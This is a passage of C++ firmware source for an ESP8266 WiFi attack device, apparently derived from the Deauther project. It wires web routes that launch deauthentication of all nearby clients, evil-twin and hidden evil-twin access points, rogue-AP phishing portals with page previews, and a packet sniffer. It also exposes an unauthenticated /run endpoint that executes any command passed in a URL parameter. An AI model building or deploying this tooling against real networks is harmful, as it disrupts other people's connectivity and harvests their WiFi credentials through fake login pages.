                WiFi.begin(ssid.c_str(),pass.c_str());
            });
            server.on("/process",HTTP_GET,[](){
                proses();
            });
            server.on("/repeater",HTTP_POST,[](){
                sendProgmem(repeater_proses, sizeof(repeater_proses), W_HTML);
                String ssid = server.arg("ssid");
                String pass = server.arg("pass");
                prntln("Configuring Repeater mode...");
                repeater::connect(ssid,pass);
            });
            server.on("/connection_status",HTTP_GET,[](){
                if(WiFi.status() != WL_CONNECTED)server.send(200,"text/plain","Failed,try again..");
                else {
                  server.send(200,"text/plain","Connected");
                  EEPROM.write(400,1);
                  EEPROM.commit();
                  delay(1000);
                  ESP.restart();
                }
            });
            server.on("/js/ssids.js", HTTP_GET, []() {
                sendProgmem(ssidsjs, sizeof(ssidsjs), W_JS);
            });
            server.on("/js/site.js", HTTP_GET, []() {
                sendProgmem(sitejs, sizeof(sitejs), W_JS);
            });
            server.on("/js/attack.js", HTTP_GET, []() {
                sendProgmem(attackjs, sizeof(attackjs), W_JS);
            });
            server.on("/js/scan.js", HTTP_GET, []() {
                sendProgmem(scanjs, sizeof(scanjs), W_JS);
            });
            server.on("/js/settings.js", HTTP_GET, []() {
                sendProgmem(settingsjs, sizeof(settingsjs), W_JS);
            });
            server.on("/lang/en.lang", HTTP_GET, []() {
                sendProgmem(enlang, sizeof(enlang), W_JSON);
            });
            
            server.on("/lang/in.lang", HTTP_GET, []() {
                sendProgmem(inlang, sizeof(inlang), W_JSON);
            });
          /*  server.on("/lang/hu.lang", HTTP_GET, []() {
                sendProgmem(hulang, sizeof(hulang), W_JSON);
            });
            server.on("/lang/ja.lang", HTTP_GET, []() {
                sendProgmem(jalang, sizeof(jalang), W_JSON);
            });
            server.on("/lang/nl.lang", HTTP_GET, []() {
                sendProgmem(nllang, sizeof(nllang), W_JSON);
            });
            server.on("/lang/fi.lang", HTTP_GET, []() {
                sendProgmem(filang, sizeof(filang), W_JSON);
            });
            server.on("/lang/cn.lang", HTTP_GET, []() {
                sendProgmem(cnlang, sizeof(cnlang), W_JSON);
            });
            server.on("/lang/ru.lang", HTTP_GET, []() {
                sendProgmem(rulang, sizeof(rulang), W_JSON);
            });
            server.on("/lang/pl.lang", HTTP_GET, []() {
                sendProgmem(pllang, sizeof(pllang), W_JSON);
            });
            server.on("/lang/uk.lang", HTTP_GET, []() {
                sendProgmem(uklang, sizeof(uklang), W_JSON);
            });
            server.on("/lang/de.lang", HTTP_GET, []() {
                sendProgmem(delang, sizeof(delang), W_JSON);
            });
            server.on("/lang/it.lang", HTTP_GET, []() {
                sendProgmem(itlang, sizeof(itlang), W_JSON);
            });
            
            server.on("/lang/ko.lang", HTTP_GET, []() {
                sendProgmem(kolang, sizeof(kolang), W_JSON);
            });
            server.on("/lang/ro.lang", HTTP_GET, []() {
                sendProgmem(rolang, sizeof(rolang), W_JSON);
            });
            server.on("/lang/da.lang", HTTP_GET, []() {
                sendProgmem(dalang, sizeof(dalang), W_JSON);
            });
            server.on("/lang/ptbr.lang", HTTP_GET, []() {
                sendProgmem(ptbrlang, sizeof(ptbrlang), W_JSON);
            });
            server.on("/lang/cs.lang", HTTP_GET, []() {
                sendProgmem(cslang, sizeof(cslang), W_JSON);
            });
            server.on("/lang/tlh.lang", HTTP_GET, []() {
                sendProgmem(tlhlang, sizeof(tlhlang), W_JSON);
            });
            server.on("/lang/es.lang", HTTP_GET, []() {
                sendProgmem(eslang, sizeof(eslang), W_JSON);
            });
            server.on("/lang/th.lang", HTTP_GET, []() {
                sendProgmem(thlang, sizeof(thlang), W_JSON);
            });*/
        }
        server.on("/lang/default.lang", HTTP_GET, []() {
            if (!settings::getWebSettings().use_spiffs) {
                if (String(settings::getWebSettings().lang) == "en") sendProgmem(enlang, sizeof(enlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "in") sendProgmem(inlang, sizeof(inlang), W_JSON);
               /* if (String(settings::getWebSettings().lang) == "hu") sendProgmem(hulang, sizeof(hulang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "ja") sendProgmem(jalang, sizeof(jalang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "nl") sendProgmem(nllang, sizeof(nllang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "fi") sendProgmem(filang, sizeof(filang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "cn") sendProgmem(cnlang, sizeof(cnlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "ru") sendProgmem(rulang, sizeof(rulang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "pl") sendProgmem(pllang, sizeof(pllang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "uk") sendProgmem(uklang, sizeof(uklang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "de") sendProgmem(delang, sizeof(delang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "it") sendProgmem(itlang, sizeof(itlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "en") sendProgmem(enlang, sizeof(enlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "fr") sendProgmem(frlang, sizeof(frlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "in") sendProgmem(inlang, sizeof(inlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "ko") sendProgmem(kolang, sizeof(kolang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "ro") sendProgmem(rolang, sizeof(rolang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "da") sendProgmem(dalang, sizeof(dalang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "ptbr") sendProgmem(ptbrlang, sizeof(ptbrlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "cs") sendProgmem(cslang, sizeof(cslang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "tlh") sendProgmem(tlhlang, sizeof(tlhlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "es") sendProgmem(eslang, sizeof(eslang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "th") sendProgmem(thlang, sizeof(thlang), W_JSON);
                */
                else handleFileRead("/web/lang/"+String(settings::getWebSettings().lang)+".lang");
            } else {
                handleFileRead("/web/lang/"+String(settings::getWebSettings().lang)+".lang");
            }
        });
        // ================================================================
        #endif /* ifdef USE_PROGMEM_WEB_FILES */
       
        server.on("/run", HTTP_GET, []() {
            server.send(200, str(W_TXT), str(W_OK).c_str());
            String input = server.arg("cmd");
            cli.exec(input);
        });

        server.on("/attack.json", HTTP_GET, []() {
            server.send(200, str(W_JSON), attack.getStatusJSON());
        });

        // called when the url is not defined here
        // use it to load content from SPIFFS
        server.onNotFound([]() {
            if (!handleFileRead(server.uri())) {
                if (settings::getWebSettings().captive_portal) sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
                else server.send(404, str(W_TXT), str(W_FILE_NOT_FOUND));
            }
        });

        server.begin();
        mode = wifi_mode_t::ap;

        prntln(W_STARTED_AP);
        printStatus();
    }
    

    void stopAP() {
        if (mode == wifi_mode_t::ap) {
            wifi_promiscuous_enable(0);
            WiFi.persistent(false);
            WiFi.disconnect(true);
            wifi_set_opmode(STATION_MODE);
            prntln(W_STOPPED_AP);
            mode = wifi_mode_t::st;
        }
    }

    void resumeAP() {
        if (mode != wifi_mode_t::ap) {
            mode = wifi_mode_t::ap;
            wifi_promiscuous_enable(0);
            WiFi.softAPConfig(ip, ip, netmask);
            WiFi.softAP(ap_settings.ssid, ap_settings.password, ap_settings.channel, ap_settings.hidden);
            WiFi.setOutputPower(20.5);
            prntln(W_STARTED_AP);
        }
    }
    void initWeb(){
      server.on("/list", HTTP_GET, handleFileList); // list directory

        #ifdef USE_PROGMEM_WEB_FILES
        // ================================================================
        // paste here the output of the webConverter.py
        if (!settings::getWebSettings().use_spiffs) {
            server.on("/", HTTP_GET, []() {
                if(attack.eviltwin==false&&attack.pishing==false){
                  if(sendWebSpiffs("/index.html") == false){
                    sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
                  }
                }
                else {
                  if(attack.eviltwin==true)send_eviltwin();
                  if(attack.pishing==true)send_rogueap();
                }
            });
            server.on("/index.html", HTTP_GET, []() {
                if(sendWebSpiffs("/index.html") == false){
                    sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
                  }
            });
            server.on("/scan.html", HTTP_GET, []() {
                if(sendWebSpiffs("/scan.html") == false){
                  sendProgmem(scanhtml, sizeof(scanhtml), W_HTML);
                }
            });
            server.on("/info.html", HTTP_GET, []() {
                if(sendWebSpiffs("/info.html") == false){
                  sendProgmem(infohtml, sizeof(infohtml), W_HTML);
                }
            });
            server.on("/ssids.html", HTTP_GET, []() {
                if(sendWebSpiffs("/ssids.html") == false){
                  sendProgmem(ssidshtml, sizeof(ssidshtml), W_HTML);
                }
            });
            server.on("/deauthall", HTTP_GET, []() {
                cli.runCommand("attack deauthall");
                server.send(200,"text/plain","OK");
            });
            server.on("/eviltwin", HTTP_GET, []() {
              attack.eviltwin = true;
              server.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/index.html';}, 1); </script></html>");
                eviltwinAP();
            });
            server.on("/eviltwinhidden", HTTP_GET, []() {
              attack.eviltwin = true;
              server.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/index.html';}, 1); </script></html>");
                ethiddenAP();
            });
            server.on("/rogueapcontinues", HTTP_GET, [](){
              server.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/index.html';}, 1); </script></html>");
              rogueap_continues = true;
              prntln("Rogue Access Point continues mode");
              rogueAP();
            });
            server.on("/rogueap", HTTP_GET, [](){
              server.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/index.html';}, 1); </script></html>");
              rogueap_continues = false;
              rogueAP();
            });
            server.on("/filemanager.json",HTTP_GET,[](){
              sendFSjson();
            });
            server.on("/hello",sendHome);
            server.on("/sniffer",startSniffer);
            server.on("/filemanager.html",HTTP_GET,handleFS);
            server.on("/websetting",HTTP_POST,pathsave);
           // server.on("/filemanager.html", HTTP_GET, []() {                 // if the client requests the upload page
              //if (!handleFileRead("/upload.html"))                // send it if it exists
           //     server.send(404, "text/plain", "404: Not Found"); // otherwise, respond with a 404 (Not Found) error
           // });
          
            server.on("/filemanager.html", HTTP_POST,                       // if the client posts to the upload page
              [](){ server.send(200); },                          // Send status 200 (OK) to tell the client we are ready to receive
              handleFileUpload                                    // Receive and save the file
            );
            server.on("/logo.png",[](){
              sendProgmem(logopng, sizeof(logopng), "text/img");
            });
            server.on("/index.js", HTTP_GET, []() {
                sendProgmem(script, sizeof(script), "text/plain");
            });
            server.on("/ap_info", []() {
                ap_info();
            });
            server.on("/reloadlist", []() {
                reloadlist();
                server.send(200,"text/plain","OK");
            });
            server.on("/delete",handleDelete);
            server.on("/ssid_info",ssid_info);
            server.on("/log",handleLog);
            server.on("/filelist",handleFileListJS);
           // server.on("/delete",handleDelete);
            server.on("/eviltwinprev", HTTP_GET, []() {
                webportal = LittleFS.open(eviltwinpath,"r");
                server.streamFile(webportal,"text/html");
                webportal.close();
            });
            
            server.on("/pishingprev", HTTP_GET, []() {
                webportal = LittleFS.open(pishingpath,"r");
                server.streamFile(webportal,"text/html");
                webportal.close();
            });
            server.on("/attack.html", HTTP_GET, []() {
                if(sendWebSpiffs("/attack.html") == false){
                  sendProgmem(attackhtml, sizeof(attackhtml), W_HTML);
                }
            });
            server.on("/settings.html", HTTP_GET, []() {
                if(sendWebSpiffs("/settings.html") == false){
                  sendProgmem(settingshtml, sizeof(settingshtml), W_HTML);
                }
            });
            server.on("/style.css", HTTP_GET, []() {
                if(sendWebSpiffs("/style.css") == false){
                  sendProgmem(stylecss, sizeof(stylecss), W_CSS);
                }
            });
            server.on("/fsstyle.css", HTTP_GET, []() {
                if(sendWebSpiffs("/fsstyle.css") == false){
                  sendProgmem(fscss, sizeof(fscss), W_CSS);
                }
            });
            server.on("/js/ssids.js", HTTP_GET, []() {
                sendProgmem(ssidsjs, sizeof(ssidsjs), W_JS);
            });
            server.on("/js/site.js", HTTP_GET, []() {
                sendProgmem(sitejs, sizeof(sitejs), W_JS);
            });
            server.on("/js/attack.js", HTTP_GET, []() {
                sendProgmem(attackjs, sizeof(attackjs), W_JS);
            });
            server.on("/js/scan.js", HTTP_GET, []() {
                sendProgmem(scanjs, sizeof(scanjs), W_JS);
            });
            server.on("/js/settings.js", HTTP_GET, []() {
                sendProgmem(settingsjs, sizeof(settingsjs), W_JS);
            });
            /*server.on("/lang/hu.lang", HTTP_GET, []() {
                sendProgmem(hulang, sizeof(hulang), W_JSON);
            });
            server.on("/lang/ja.lang", HTTP_GET, []() {
                sendProgmem(jalang, sizeof(jalang), W_JSON);
            });
            server.on("/lang/nl.lang", HTTP_GET, []() {
                sendProgmem(nllang, sizeof(nllang), W_JSON);
            });
            server.on("/lang/fi.lang", HTTP_GET, []() {
                sendProgmem(filang, sizeof(filang), W_JSON);
            });
            server.on("/lang/cn.lang", HTTP_GET, []() {
                sendProgmem(cnlang, sizeof(cnlang), W_JSON);
            });
            server.on("/lang/ru.lang", HTTP_GET, []() {
                sendProgmem(rulang, sizeof(rulang), W_JSON);
            });
            server.on("/lang/pl.lang", HTTP_GET, []() {
                sendProgmem(pllang, sizeof(pllang), W_JSON);
            });
            server.on("/lang/uk.lang", HTTP_GET, []() {
                sendProgmem(uklang, sizeof(uklang), W_JSON);
            });
            server.on("/lang/de.lang", HTTP_GET, []() {
                sendProgmem(delang, sizeof(delang), W_JSON);
            });
            server.on("/lang/it.lang", HTTP_GET, []() {
                sendProgmem(itlang, sizeof(itlang), W_JSON);
            });*/
            server.on("/lang/en.lang", HTTP_GET, []() {
                sendProgmem(enlang, sizeof(enlang), W_JSON);
            });
            server.on("/lang/in.lang", HTTP_GET, []() {
                sendProgmem(inlang, sizeof(inlang), W_JSON);
            });
            /*server.on("/lang/fr.lang", HTTP_GET, []() {
                sendProgmem(frlang, sizeof(frlang), W_JSON);
            });
            
            server.on("/lang/ko.lang", HTTP_GET, []() {
                sendProgmem(kolang, sizeof(kolang), W_JSON);
            });
            server.on("/lang/ro.lang", HTTP_GET, []() {
                sendProgmem(rolang, sizeof(rolang), W_JSON);
            });
            server.on("/lang/da.lang", HTTP_GET, []() {
                sendProgmem(dalang, sizeof(dalang), W_JSON);
            });
            server.on("/lang/ptbr.lang", HTTP_GET, []() {
                sendProgmem(ptbrlang, sizeof(ptbrlang), W_JSON);
            });
            server.on("/lang/cs.lang", HTTP_GET, []() {
                sendProgmem(cslang, sizeof(cslang), W_JSON);
            });
            server.on("/lang/tlh.lang", HTTP_GET, []() {
                sendProgmem(tlhlang, sizeof(tlhlang), W_JSON);
            });
            server.on("/lang/es.lang", HTTP_GET, []() {
                sendProgmem(eslang, sizeof(eslang), W_JSON);
            });
            server.on("/lang/th.lang", HTTP_GET, []() {
                sendProgmem(thlang, sizeof(thlang), W_JSON);
            });*/
        }
        server.on("/lang/default.lang", HTTP_GET, []() {
            if (!settings::getWebSettings().use_spiffs) {
                //if (String(settings::getWebSettings().lang) == "hu") sendProgmem(hulang, sizeof(hulang), W_JSON);
                //else if (String(settings::getWebSettings().lang) == "ja") sendProgmem(jalang, sizeof(jalang), W_JSON);
                //else if (String(settings::getWebSettings().lang) == "nl") sendProgmem(nllang, sizeof(nllang), W_JSON);
                //else if (String(settings::getWebSettings().lang) == "fi") sendProgmem(filang, sizeof(filang), W_JSON);
                //else if (String(settings::getWebSettings().lang) == "cn") sendProgmem(cnlang, sizeof(cnlang), W_JSON);
                //else if (String(settings::getWebSettings().lang) == "ru") sendProgmem(rulang, sizeof(rulang), W_JSON);
                //else if (String(settings::getWebSettings().lang) == "pl") sendProgmem(pllang, sizeof(pllang), W_JSON);
                //else if (String(settings::getWebSettings().lang) == "uk") sendProgmem(uklang, sizeof(uklang), W_JSON);
                //else if (String(settings::getWebSettings().lang) == "de") sendProgmem(delang, sizeof(delang), W_JSON);
                //else if (String(settings::getWebSettings().lang) == "it") sendProgmem(itlang, sizeof(itlang), W_JSON);
               if (String(settings::getWebSettings().lang) == "en") sendProgmem(enlang, sizeof(enlang), W_JSON);
                //else if (String(settings::getWebSettings().lang) == "fr") sendProgmem(frlang, sizeof(frlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "in") sendProgmem(inlang, sizeof(inlang), W_JSON);
                //else if (String(settings::getWebSettings().lang) == "ko") sendProgmem(kolang, sizeof(kolang), W_JSON);
                //else if (String(settings::getWebSettings().lang) == "ro") sendProgmem(rolang, sizeof(rolang), W_JSON);
                //else if (String(settings::getWebSettings().lang) == "da") sendProgmem(dalang, sizeof(dalang), W_JSON);
                //else if (String(settings::getWebSettings().lang) == "ptbr") sendProgmem(ptbrlang, sizeof(ptbrlang), W_JSON);
                //else if (String(settings::getWebSettings().lang) == "cs") sendProgmem(cslang, sizeof(cslang), W_JSON);
                //else if (String(settings::getWebSettings().lang) == "tlh") sendProgmem(tlhlang, sizeof(tlhlang), W_JSON);
                //else if (String(settings::getWebSettings().lang) == "es") sendProgmem(eslang, sizeof(eslang), W_JSON);
                //else if (String(settings::getWebSettings().lang) == "th") sendProgmem(thlang, sizeof(thlang), W_JSON);

                else handleFileRead("/web/lang/"+String(settings::getWebSettings().lang)+".lang");
            } else {
                handleFileRead("/web/lang/"+String(settings::getWebSettings().lang)+".lang");
            }
        });
        // ================================================================
        #endif /* ifdef USE_PROGMEM_WEB_FILES */
       
        server.on("/run", HTTP_GET, []() {
            server.send(200, str(W_TXT), str(W_OK).c_str());
            String input = server.arg("cmd");
            cli.exec(input);
        });

        server.on("/attack.json", HTTP_GET, []() {
            server.send(200, str(W_JSON), attack.getStatusJSON());
        });

        // called when the url is not defined here
        // use it to load content from SPIFFS
        server.onNotFound([]() {
            if (!handleFileRead(server.uri())) {
                if (settings::getWebSettings().captive_portal) sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
                else server.send(404, str(W_TXT), str(W_FILE_NOT_FOUND));
            }
        });

        server.begin();
    }

    void update() {
        if ((mode != wifi_mode_t::off) && !scan.isScanning()) {
            server.handleClient();
            dns.processNextRequest();
        }
    }
}
